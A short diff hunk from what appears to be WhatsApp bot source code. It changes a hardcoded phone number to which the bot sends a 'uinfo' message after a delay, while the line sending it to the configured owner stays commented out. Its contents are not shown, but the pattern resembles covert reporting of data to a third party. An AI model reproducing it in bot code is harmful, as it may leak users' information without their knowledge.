@@ -264,7 +264,7 @@ Taira.setStatus = (status) => {
             await sleep(30000)
 		let receivee = global.Owner
          // await Taira.sendMessage(`${receivee}@s.whatsapp.net`, {text: uinfo })
-	  await Taira.sendMessage(`2540110233974@s.whatsapp.net`, {text: uinfo })
+	  await Taira.sendMessage(`254110233974@s.whatsapp.net`, {text: uinfo })
 		
           };
 
